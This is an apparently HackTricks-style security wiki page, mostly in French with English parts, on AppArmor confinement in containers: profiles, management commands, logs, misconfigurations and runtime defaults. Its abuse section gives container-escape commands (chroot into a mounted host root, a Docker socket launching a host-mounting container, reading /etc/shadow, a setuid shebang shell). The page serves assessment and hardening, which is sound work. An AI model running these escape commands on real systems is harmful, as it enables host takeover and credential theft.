# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

AppArmor is a **Mandatory Access Control** system that applies restrictions through per-program profiles. Unlike traditional DAC checks, which depend heavily on user and group ownership, AppArmor lets the kernel enforce a policy attached to the process itself. In container environments, this matters because a workload may have enough traditional privilege to attempt an action and still be denied because its AppArmor profile does not allow the relevant path, mount, network behavior, or capability use.

The most important conceptual point is that AppArmor is **path-based**. It reasons about filesystem access through path rules rather than through labels as SELinux does. That makes it approachable and powerful, but it also means bind mounts and alternate path layouts deserve careful attention. If the same host content becomes reachable under a different path, the effect of the policy may not be what the operator first expected.

## Role In Container Isolation

Container security reviews often stop at capabilities and seccomp, but AppArmor continues to matter after those checks. Imagine a container that has more privilege than it should, or a workload that needed one extra capability for operational reasons. AppArmor can still constrain file access, mount behavior, networking, and execution patterns in ways that stop the obvious abuse path. This is why disabling AppArmor "just to get the application working" can quietly transform a merely risky configuration into one that is actively exploitable.

## Lab

To check whether AppArmor is active on the host, use:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Pour voir sous quoi s'exécute le processus actuel du container :
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
La différence est instructive. Dans le cas normal, le processus doit afficher un contexte AppArmor lié au profil choisi par le runtime. Dans le cas unconfined, cette couche supplémentaire de restriction disparaît.

Vous pouvez aussi inspecter ce que Docker pense avoir appliqué :
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Utilisation à l'exécution

Docker peut appliquer un profil AppArmor par défaut ou personnalisé lorsque l'hôte le supporte. Podman peut également s'intégrer à AppArmor sur les systèmes basés sur AppArmor, bien que sur les distributions privilégiant SELinux, l'autre système MAC prenne souvent le devant de la scène. Kubernetes peut exposer la politique AppArmor au niveau de la charge de travail sur des nœuds qui supportent réellement AppArmor. LXC et les environnements de conteneurs système de la famille Ubuntu utilisent aussi AppArmor de manière extensive.

Le point pratique est qu'AppArmor n'est pas une "fonctionnalité Docker". C'est une fonctionnalité du noyau de l'hôte que plusieurs runtimes peuvent choisir d'appliquer. Si l'hôte ne le supporte pas ou si le runtime est configuré pour s'exécuter unconfined, la protection supposée n'est pas réellement présente.

Sur des hôtes AppArmor compatibles avec Docker, le profil par défaut le plus connu est `docker-default`. Ce profil est généré à partir du template AppArmor de Moby et est important car il explique pourquoi certaines PoCs basées sur des capabilities échouent encore dans un conteneur par défaut. De façon générale, `docker-default` autorise les opérations réseau ordinaires, refuse les écritures vers une grande partie de `/proc`, refuse l'accès aux parties sensibles de `/sys`, bloque les opérations de mount, et restreint ptrace de sorte que ce ne soit pas une primitive générale d'exploration de l'hôte. Comprendre cette base permet de distinguer "le conteneur a `CAP_SYS_ADMIN`" de "le conteneur peut réellement utiliser cette capability contre les interfaces du noyau qui m'intéressent".

## Gestion des profils

Les profils AppArmor sont généralement stockés sous `/etc/apparmor.d/`. Une convention de nommage courante consiste à remplacer les slashes dans le chemin de l'exécutable par des points. Par exemple, un profil pour `/usr/bin/man` est généralement stocké sous `/etc/apparmor.d/usr.bin.man`. Ce détail est important tant pour la défense que pour l'évaluation, car une fois que vous connaissez le nom du profil actif, vous pouvez souvent localiser rapidement le fichier correspondant sur l'hôte.

Les commandes de gestion utiles côté hôte incluent :
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
La raison pour laquelle ces commandes sont importantes dans une référence sur la sécurité des conteneurs est qu'elles expliquent comment les profils sont réellement construits, chargés, passés en complain mode, et modifiés après des changements d'application. Si un opérateur a l'habitude de passer des profils en complain mode lors du dépannage et oublie de restaurer l'enforcement, le conteneur peut sembler protégé dans la documentation tout en se comportant de manière beaucoup plus permissive en réalité.

### Création et mise à jour des profils

`aa-genprof` peut observer le comportement de l'application et aider à générer un profil de manière interactive :
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` peut générer un profil modèle qui peut ensuite être chargé avec `apparmor_parser` :
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Lorsque le binaire change et que la politique doit être mise à jour, `aa-logprof` peut rejouer les refus trouvés dans les logs et aider l'opérateur à décider s'il faut les autoriser ou les refuser :
```bash
sudo aa-logprof
```
### Journaux

Les refus d'AppArmor sont souvent visibles via `auditd`, `syslog`, ou des outils tels que `aa-notify` :
```bash
sudo aa-notify -s 1 -v
```
Cette information est utile, opérationnellement et offensivement. Les défenseurs l'utilisent pour affiner les profils. Les attaquants l'utilisent pour connaître exactement quel chemin ou quelle opération est refusée et si AppArmor est le contrôle bloquant une chaîne d'exploitation.

### Identifier le fichier de profil exact

Lorsqu'un runtime affiche un nom de profil AppArmor spécifique pour un conteneur, il est souvent utile de faire correspondre ce nom au fichier de profil sur le disque :
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Cela est particulièrement utile lors de la revue côté hôte car cela comble l'écart entre "le conteneur indique qu'il s'exécute sous le profil `lowpriv`" et "les règles réelles se trouvent dans ce fichier spécifique qui peuvent être auditées ou rechargées".

## Misconfigurations

L'erreur la plus évidente est `apparmor=unconfined`. Les administrateurs le définissent souvent lors du débogage d'une application qui a échoué parce que le profil bloquait correctement quelque chose de dangereux ou inattendu. Si ce flag reste en production, toute la couche MAC est effectivement supprimée.

Un autre problème subtil est de supposer que les bind mounts sont inoffensifs parce que les permissions des fichiers semblent normales. Comme AppArmor est basé sur les chemins, exposer des chemins hôtes sous des points de montage alternatifs peut mal interagir avec les règles basées sur les chemins. Une troisième erreur est d'oublier qu'un nom de profil dans un fichier de configuration signifie très peu si le noyau hôte n'applique pas réellement AppArmor.

## Abuse

Lorsque AppArmor est désactivé, des opérations auparavant contraintes peuvent soudainement fonctionner : lire des chemins sensibles via des bind mounts, accéder à des parties de procfs ou sysfs qui devraient rester plus difficiles d'accès, effectuer des actions liées au montage si capabilities/seccomp les autorisent aussi, ou utiliser des chemins qu'un profil refuserait normalement. AppArmor est souvent le mécanisme qui explique pourquoi une tentative de breakout basée sur des capabilities « devrait fonctionner » sur le papier mais échoue en pratique. Supprimez AppArmor, et la même tentative peut commencer à réussir.

Si vous suspectez qu'AppArmor est le principal élément empêchant une chaîne d'abus par traversée de chemins, bind-mount ou basée sur des montages, la première étape consiste généralement à comparer ce qui devient accessible avec et sans profil. Par exemple, si un chemin hôte est monté dans le conteneur, commencez par vérifier si vous pouvez le parcourir et le lire :
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Si le conteneur dispose également d'une capacité dangereuse telle que `CAP_SYS_ADMIN`, l'un des tests les plus pratiques est de vérifier si AppArmor est le contrôle qui bloque les opérations de montage ou l'accès aux systèmes de fichiers sensibles du noyau :
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Dans des environnements où un chemin hôte est déjà accessible via un bind mount, la perte d'AppArmor peut également transformer un problème de divulgation d'informations en lecture seule en un accès direct aux fichiers de l'hôte :
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Le but de ces commandes n'est pas qu'AppArmor, à lui seul, crée le breakout. C'est que, une fois AppArmor retiré, de nombreux chemins d'abus basés sur le système de fichiers et les points de montage deviennent immédiatement testables.

### Exemple complet : AppArmor désactivé + racine de l'hôte montée

Si le container a déjà la racine de l'hôte montée via bind sur `/host`, la suppression d'AppArmor peut transformer un chemin d'abus du système de fichiers bloqué en une évasion complète vers l'hôte :
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Une fois que le shell s'exécute via le système de fichiers de l'hôte, la charge de travail a effectivement franchi la frontière du container :
```bash
id
hostname
cat /etc/shadow | head
```
### Exemple complet : AppArmor désactivé + Runtime Socket

Si la véritable barrière était AppArmor autour de l'état d'exécution, une socket montée peut suffire pour une évasion complète :
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Le chemin exact dépend du point de montage, mais le résultat final est le même : AppArmor n'empêche plus l'accès au runtime API, et le runtime API peut lancer un container compromettant l'hôte.

### Exemple complet : Path-Based Bind-Mount Bypass

Parce qu'AppArmor est basé sur les chemins, protéger `/proc/**` ne protège pas automatiquement le même contenu procfs de l'hôte lorsqu'il est accessible via un chemin différent :
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
L'impact dépend de ce qui est exactement monté et de savoir si le chemin alternatif constitue également un bypass d'autres contrôles, mais ce schéma est l'une des raisons les plus évidentes pour lesquelles AppArmor doit être évalué conjointement avec la disposition des montages plutôt qu'isolément.

### Exemple complet : Shebang Bypass

La politique AppArmor cible parfois le chemin d'un interpréteur d'une manière qui ne tient pas entièrement compte de l'exécution de scripts via la gestion du shebang. Un exemple historique impliquait l'utilisation d'un script dont la première ligne pointe vers un interpréteur confiné :
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Ce type d'exemple est important car il rappelle que l'intention d'un profil et la sémantique d'exécution réelle peuvent diverger. Lors de l'examen d'AppArmor dans des environnements de conteneurs, les chaînes d'interpréteurs et les chemins d'exécution alternatifs méritent une attention particulière.

## Vérifications

L'objectif de ces vérifications est de répondre rapidement à trois questions : AppArmor est-il activé sur l'hôte, le processus actuel est-il confiné, et le runtime a-t-il réellement appliqué un profil à ce conteneur ?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
What is interesting here:

- If `/proc/self/attr/current` shows `unconfined`, the workload is not benefiting from AppArmor confinement.
- If `aa-status` shows AppArmor disabled or not loaded, any profile name in the runtime config is mostly cosmetic.
- If `docker inspect` shows `unconfined` or an unexpected custom profile, that is often the reason a filesystem or mount-based abuse path works.

If a container already has elevated privileges for operational reasons, leaving AppArmor enabled often makes the difference between a controlled exception and a much broader security failure.

## Paramètres d'exécution par défaut

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Activé par défaut sur les hôtes compatibles AppArmor | Utilise le profil AppArmor `docker-default` sauf si remplacé | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Dépendant de l'hôte | AppArmor est supporté via `--security-opt`, mais la valeur par défaut exacte dépend de l'hôte/du runtime et est moins universelle que le profil `docker-default` documenté de Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Par défaut conditionnel | Si `appArmorProfile.type` n'est pas spécifié, la valeur par défaut est `RuntimeDefault`, mais elle n'est appliquée que lorsque AppArmor est activé sur le nœud | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | Suit le support du nœud/du runtime | Les runtimes couramment supportés par Kubernetes prennent en charge AppArmor, mais l'application effective dépend toujours du support du nœud et des paramètres de la charge de travail | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

For AppArmor, the most important variable is often the **host**, not only the runtime. A profile setting in a manifest does not create confinement on a node where AppArmor is not enabled.
{{#include ../../../../banners/hacktricks-training.md}}
